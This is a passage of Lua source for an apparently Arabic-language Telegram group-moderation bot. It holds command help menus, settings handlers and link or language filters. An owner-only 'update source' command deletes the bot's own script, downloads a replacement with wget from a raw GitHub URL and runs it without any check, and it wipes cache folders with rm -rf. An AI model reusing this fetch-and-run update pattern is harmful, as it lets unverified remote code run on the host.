botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ ارسل لي الكليشه الان •" ,  1, "md")
botx1:set(BOT..'bot:help01'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local bot =  botx1:get(BOT..'bot:help01'..msg.sender_user_id_..'')
if bot == 'msg' then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم حفظ الكليشه الجديده •" ,  1, "md")
botx1:set(BOT..'bot:help01'..msg.sender_user_id_..'', 'no')
botx1:set(BOT..'bot:help1', text)
botdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م1$") or  text:match("^م١$") then
local help = botx1:get(BOT..'bot:help1')
local text =  [[
👁‍🗨 ⁞ ٱوٱمـر ٱلحمـٱيۿ ✓
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
   🔐*⁞* قفـل «» لقفـل امر ✓
   🔓*⁞* فتـح «» لفتـح امر ✓
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
   📚*⁞* الـروابـط          «» المـعـرف •
   📚*⁞* الـبـوتـات         «» الشارحـه •
   📚*⁞* المتحركه         «» المـلـفـات •
   📚*⁞* الـصـور            «» الملصقات •
   📚*⁞* الفيـديـو          «» الاونـلايـن • 
   📚*⁞* الدردشـه          «» الـتوجـيـه •
   📚*⁞* الاغاني            «» الـصــوت •
   📚*⁞* الجهات            «» الماركداون •
   📚*⁞* العربيه             «» الانكلـيزيه •
   📚*⁞* الحمايه            «» الــتـكـرار •
   📚*⁞* الهاشتاك           «» الـتعديـل •
   📚*⁞* التثبيت            «» الاشعارات •
   📚*⁞* الـكـل               «» الكـلايـش •
   📚*⁞* المواقـع            «» الشبـكات •
   📚*⁞* الاشعارات         «» الفارسيه •
   📚*⁞* الكفران             «» الطائفيه •
   📚*⁞* الفشار              «» الكل •
   📚*⁞* البوتات بالطرد   «» البوتات بالتقييد •
             
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
 📚*⁞* الكل بالساعات + عدد الساعات 
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
]]
botdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if is_leader(msg) and text:match("^تعيين امر م2$") then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ ارسل لي الكليشه الان •" ,  1, "md")
botx1:set(BOT..'bot:help21'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local bot =  botx1:get(BOT..'bot:help21'..msg.sender_user_id_..'')
if bot == 'msg' then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم حفظ الكليشه الجديده •" ,  1, "md")
botx1:set(BOT..'bot:help21'..msg.sender_user_id_..'', 'no')
botx1:set(BOT..'bot:help2', text)
botdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م2$") or text:match("^م٢$") then
local help = botx1:get(BOT..'bot:help2')
local text =  [[
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
 🏗*⁞* رفع بكل الصلاحيات
 🏗*⁞* الغاء خاصيه تغيير الاسم
 🏗*⁞* الغاء خاصيه التثبيت
 🏗*⁞* رفع «» تنزيل ادمن بالكروب
 🏗*⁞* رفع «» تنزيل ادمن {rep•id•us}
 🏗*⁞* رفع «» تنزيل مميز {rep•id•us}
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗

 🎖*⁞* ٱوٱمـر الحظر》تقييد》كتم》مسح  ✓
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
 📛*⁞* طرد                     {rep•id•us}
 📛*⁞* مسح الكل             {rep•id•us}
 📛*⁞* حظر «» الغاء حظر {rep•id•us}
 📛*⁞* كتم  «» الغاء كتم   {rep•id•us}
 📛*⁞* تقييد«»الغاء التقييد{rep•id•us}
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗

 🎖*⁞* ٱوٱمـر اخرى  ✓
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
 🗳*⁞* فحص • 
 🗳*⁞* اضف رد •
 🗳*⁞* مسح رد •

 🗳*⁞* تفعيل اللعبه •
 🗳*⁞* مسح الردود •
 🗳*⁞* جلب الترحيب •
 🗳*⁞* حذف الترحيب •
 🗳*⁞* رفع المشرفين •
 🗳*⁞* معلومات المجموعه •
 🗳*⁞* طرد الحسابات المحذوفه •
 🗳*⁞* تنظيف قائمه الحظر •
 🗳*⁞* منع     «» الغاء منع •
 🗳*⁞* تثبيت  «» الغاء التثبيت •
 🗳*⁞* تفعيل  «» تعطيل الايدي •
 🗳*⁞* تفعيل  «» تعطيل الحظر •
 🗳*⁞* تفعيل  «» تعطيل الطرد •
 🗳*⁞* تفعيل  «» تعطيل اطردني •
🗳*⁞* تفعيل  «» تعطيل جلب الصوره •
 🗳*⁞* تفعيل  «» تعطيل ردود البوت •
 🗳*⁞* مسح   + العدد •
 🗳*⁞* ايدي   + المعرف •
 🗳*⁞* اضافه + معرف العضو •
 🗳*⁞* اضف رسائل  + الايدي •
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗

🎖*⁞* لاضهار القوائم ✓

🗃*⁞* الدعم      «» قائمه المنع •
🗃*⁞* الردود     «» المحظورين •
🗃*⁞* المدراء    «» الاعدادات •
🗃*⁞* الادمنيه   «» المكتومين •
🗃*⁞* المقيدين  «» الاعضاء المميزين •
🗃*⁞* المطايه    «»   المميزين عام •
🗃*⁞* المنشئين  «» المدراء العامين •
🗃*⁞* الادمنيه العامين •

┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏

📚*⁞* ضع اللغه + العربيه «» الانكليزيه •

┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
]]
botdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if is_leader(msg) and text:match("^تعيين امر م3$") then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ ارسل لي الكليشه الان •" ,  1, "md")
botx1:set(BOT..'bot:help31'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local bot =  botx1:get(BOT..'bot:help31'..msg.sender_user_id_..'')
if bot == 'msg' then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم حفظ الكليشه الجديده •" ,  1, "md")
botx1:set(BOT..'bot:help31'..msg.sender_user_id_..'', 'no')
botx1:set(BOT..'bot:help3', text)
botdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م3$") or text:match("^م٣$") then
local help = botx1:get(BOT..'bot:help3')
local text =  [[
🚦*⁞* اوامر الخدمه  ✓
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
  🗳*⁞* الوقت •
  🗳*⁞* زخرفه • 
  🗳*⁞* الرابط •
  🗳*⁞* موقعي •
  🗳*⁞* جهاتي •
  🗳*⁞* نقاطي •
  🗳*⁞* اطردني •
  🗳*⁞* صورتي •
  🗳*⁞* رسائلي •
  🗳*⁞* ايديي •
  🗳*⁞* معرفي •
  🗳*⁞* اسمي •
  🗳*⁞* ايدي •
  🗳*⁞* سمايلات •
  🗳*⁞* ترتيب •
  🗳*⁞* معلوماتي •
  🗳*⁞* القوانين •
  🗳*⁞* السورس •
  🗳*⁞* المطور •
  🗳*⁞* بيع نقاطي •
  🗳*⁞* مسح رسائلي •
  🗳*⁞* ايدي بالرد •
  🗳*⁞* الرتبه بالرد •
  🗳*⁞* هينه بالرد •
  🗳*⁞* بوسه بالرد •
  🗳*⁞* بوسها بالرد •
  🗳*⁞* رابط الحذف •
  🗳*⁞* رسائلي اليوم •
  🗳*⁞* مشاهده المنشور •
  🗳*⁞* ايدي المجموعه •
  🗳*⁞* اسم المجموعه •
  🗳*⁞* رفع «» تنزيل مطي •
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
  📚*⁞* رتبته       + المعرف •
  📚*⁞* كول       + الكلمه •
  📚*⁞* تاك        + المعرف •
  📚*⁞* هينه      + المعرف •
  📚*⁞* صورتي  + الرقم •
  📚*⁞* الحساب + الايدي •
  📚*⁞* طقس    + اسم المدينه •
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
]]
botdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if is_leader(msg) and text:match("^تعيين امر م4$") then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ ارسل لي الكليشه الان •" ,  1, "md")
botx1:set(BOT..'bot:help41'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local bot =  botx1:get(BOT..'bot:help41'..msg.sender_user_id_..'')
if bot == 'msg' then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم حفظ الكليشه الجديده •" ,  1, "md")
botx1:set(BOT..'bot:help41'..msg.sender_user_id_..'', 'no')
botx1:set(BOT..'bot:help4', text)
botdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م٤$") or text:match("^م4$") then
local help = botx1:get(BOT..'bot:help4')
local text =  [[
🎖*⁞* ٱوٱمـر لـوضع ✓
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
    🎨*⁞* تعيين «» مسح الايدي •
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
    🎨*⁞* ضع + احد الاوامر ادناه •
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
    🎲*⁞* رابط   «»  قوانين • 
    🎲*⁞* صوره  «» ترحيب •
    🎲*⁞* تكرار + العدد •
    🎲*⁞* عدد الاحرف + العدد •
    🎲*⁞* اسم المجموعه + الاسم •
    🎲*⁞* التكرار + بالطرد «» بالمسح •
    🎲*⁞* الايدي + بالصوره «» بدون صوره •
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏ 
    🎨*⁞* ٱوٱمـر لمسـح ✓
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗ 
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
   🗃*⁞* مسح القوائم 
   🗃*⁞* المحظورين «» البوتات •
   🗃*⁞* المكتومين  «» الادمنيه •
   🗃*⁞* المقيدين    «» الاعضاء المميزين •
   🗃*⁞* قائمه المنع «» قائمه المنع العام 
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
]]
botdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if is_leader(msg) and text:match("^تعيين امر م5$") then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ ارسل لي الكليشه الان •" ,  1, "md")
botx1:set(BOT..'bot:help51'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local bot =  botx1:get(BOT..'bot:help51'..msg.sender_user_id_..'')
if bot == 'msg' then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم حفظ الكليشه الجديده •" ,  1, "md")
botx1:set(BOT..'bot:help51'..msg.sender_user_id_..'', 'no')
botx1:set(BOT..'bot:help5', text)
botdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م٥$") or text:match("^م5$") then
local help = botx1:get(BOT..'bot:help5')
local text =  [[
🚦*⁞* اوامر المطورين  ✓
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏

  📚*⁞* تفعيل •
  📚*⁞* تعطيل •
  📚*⁞* السيرفر •
  📚*⁞* غادر •
  📚*⁞* الكروبات •
  📚*⁞* المجموعات •
  ??*⁞* الاحصائيات •
  📚*⁞* تحديث •
  📚*⁞* تحديث السورس •
  📚*⁞* توجيه للكل  •

  💶*⁞* استعاده الاوامر •
  💶*⁞* تعيين الاوامر •
  💶*⁞* تعيين امر م1 •
  💶*⁞* تعيين امر م2 •
  💶*⁞* تعيين امر م3 •
  💶*⁞* تعيين امر م4 •
  💶*⁞* تعيين امر م5 •

  🚠*⁞* اضف رد للكل •
  🚠*⁞* مسح رد للكل •  

  🗳*⁞* حظر عام •
  🗳*⁞* الغاء العام •
  🗳*⁞* ضع دعم •
  🗳*⁞* حذف الدعم •
  🗳*⁞* جلب الملاحظه •
  🗳*⁞* تنظيف الرسائل •
  🗳*⁞* تنظيف الكروبات •
  🗳*⁞* جلب رد الخاص •
  🗳*⁞* حذف رد الخاص •
  🗳*⁞* ردود المطور •
  🗳*⁞* قائمه العام •
  🗳*⁞* قائمه المنع العام •
  🗳*⁞* مطورين الرتبه الثالثه •

  🌿*⁞* تفعيل كل الكروبات •
  🌿*⁞* تعطيل كل الكروبات •

  🗃*⁞* تفعيل البوت الخدمي •
  🗃*⁞* تعطيل البوت الخدمي •

  🗃*⁞* رفع «» تنزيل مدير •
  🗃*⁞* رفع «» تنزيل منشئ •
  🗃*⁞* رفع «» تنزيل مدير عام •
  ??*⁞* رفع «» تنزيل ادمن عام •
  🗃*⁞* رفع «» تنزيل مميز عام •
  🗃*⁞* رفع «» تنزيل مطور رتبه ثالثه •

  🗃*⁞* رد الخاص تفعيل «» تعطيل •
  🗃*⁞* المغادره التلقائيه تفعيل «» تعطيل •

  🚠*⁞* قناة الاشتراك •
  🚠*⁞* تعيين «» تغيير قناة الاشتراك •
  🚠*⁞* تفعيل «» تعطيل الاشتراك الاجباري •
  
  📱*⁞* مسح المدراء •
  📱*⁞* مسح المنشئين •
  📱*⁞* مسح  قائمه العام •
  📱*⁞* مسح ردود المطور •
  📱*⁞* مسح المميزين عام •
  📱*⁞* مسح المدراء العامين •
  📱*⁞* مسح الادمنيه العامين •
  📱*⁞* مسح قائمه المنع العام •
  📱*⁞* مسح مطورين الرتبه الثالثه •

  💷*⁞* كشف                    + ايدي الكروب •
  💷*⁞* اذاعه                    + المنشور •
  💷*⁞* فلتر عام               + الكلمه •
  💷*⁞* الغاء فلتر عام        + الكليشه •
  💷*⁞* ضع ملاحظه         + الملاحظه •
  💷*⁞* نشر بالخاص         + المنشور •
  💷*⁞* ضع رد الخاص      + الكليشه •
  💷*⁞* ضع كليشه المطور + الكليشه •

┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
]]
botdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
---------------bot
if text == "تحديث السورس" and is_leader(msg) then 
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ جاري تحديث السورس الى الاصدار الجديد •', 1, 'md') 
os.execute('rm -rf BOT.lua') 
os.execute('wget https://raw.githubusercontent.com/iran8990/BOT/master/BOT.lua') 
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تحديث السورس اكتشف المميزات الجديده الان •', 1, 'md') 
dofile('BOT.lua') 
io.popen("rm -rf ~/.telegram-cli/data/audio/*")
io.popen("rm -rf ~/.telegram-cli/data/document/*")
io.popen("rm -rf ~/.telegram-cli/data/photo/*")
io.popen("rm -rf ~/.telegram-cli/data/sticker/*")
io.popen("rm -rf ~/.telegram-cli/data/temp/*")
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*")
io.popen("rm -rf ~/.telegram-cli/data/voice/*")
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
end 
if text == 'تحديث' and is_leader(msg) then  
dofile('BOT.lua')  io.popen("rm -rf ~/.telegram-cli/data/audio/*") 
io.popen("rm -rf ~/.telegram-cli/data/document/*") 
io.popen("rm -rf ~/.telegram-cli/data/photo/*") 
io.popen("rm -rf ~/.telegram-cli/data/sticker/*") 
io.popen("rm -rf ~/.telegram-cli/data/temp/*") 
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*") 
io.popen("rm -rf ~/.telegram-cli/data/voice/*") 
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
print("\27[31;47m\n          💥»» تم تحديث البوت ««💥          \n\27[0;34;49m\n") 
botdx(msg.chat_id_, msg.id_, 1, "🎖 ⁞ تم تحديث البوت •", 1, "md")
end 
if text and text:match("^اضف رسائل (%d+)$") and is_monsh(msg.sender_user_id_, msg.chat_id_) then  
bot0 = text:match("^اضف رسائل (%d+)$")
botx1:set('bot:'..bot_id..'id:user'..msg.chat_id_,bot0)  
botx1:setex('bot:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
botdx(msg.chat_id_, msg.id_, 1, "🎖 ⁞ ارسل عدد الرسائل •", 1, "md")
botdx(msg.chat_id_, msg.id_, 1,Anwar, 1, 'md') 
end 
---------------bot
if is_leader(msg) then
local text = msg.content_.text_:gsub("[Ss]etprice", "Setnerkh")
if text:match("^[Ss]etnerkh$") or text:match("^ضع كليشه المطور$") then
if botx1:get(BOT.."lang:gp:" .. msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🎖 ⁞ Plese Send your now •", 1, "md")
else
botdx(msg.chat_id_, msg.id_, 1, "🎖 ⁞ ارسل لي كليشه المطور الان •", 1, "md")
end
botx1:setex(BOT.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 100, true)
end end
-------------------------------------------------bot----------------------------------------------
if text:match("^قرنابيط$") then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ قنوات السورس •\n\n• [@rambo_syr1] •\n\n• [@th3victory] •\n ['..os.date("%H:%M:%S")..']', 1, 'md')    
end end
if tonumber(msg.sender_user_id_) == tonumber(bot_owner) then 
if (msg.content_.text_ == 'stats server' or msg.content_.text_ == 'السيرفر') then 
local bot = '*مضى على تشغيل السيرفر*\n\n' 
  local botdx2 = botx1:info()
  bot = bot..'*'..botdx2.server.uptime_in_days..' يوم \n'..botdx2.server.uptime_in_seconds..' ثانيه*\n'
  botdx(msg.chat_id_, msg.id_, 1, bot, 1, 'md')
end
end
-----------------------------------------bot------------------------------------------------------ 
end   
-----------------------------------------bot------------------------------------------------------
-- end code --
-- Number Update 5
---------------------------------------bot--------------------------------------------------------
elseif (data.ID == "UpdateChat") then
chat = data.chat_
chats[chat.id_] = chat
---------------------------------------bot-------------------------------------------------------- 
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
function get_msg_contact(extra, result, success)
local text = (result.content_.text_ or result.content_.caption_)
if result.id_ and result.content_.text_ then
botx1:set(BOT..'bot:editid'..result.id_,result.content_.text_)
end 
if not is_vipmem(result.sender_user_id_, result.chat_id_) then
check_filter_words(result, text)
if botx1:get(BOT..'editmsg'..msg.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
if botx1:get(BOT..'bot:links:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match("/") then
if botx1:get(BOT..'bot:webpage:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("@") then
if botx1:get(BOT..'tags:lock'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("#") then
if botx1:get(BOT..'bot:hashtag:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[\216-\219][\128-\191]") then
if botx1:get(BOT..'bot:arabic:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[A-Z]") or text:match("[a-z]") then
if botx1:get(BOT..'bot:english:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end end end
getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
---------------------------------------bot--------------------------------------------------------
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
tdcli_function ({ID="GetChats", offset_order_="9223372036854775807", offset_chat_id_=0, limit_=20}, dl_cb, nil)
end
-----------------------------------------bot------------------------------------------------------ 
end
-- END VERSION BOT DX 
-- all the file by  dx @ 
-- join in chennel @ 
-- join in chennel @
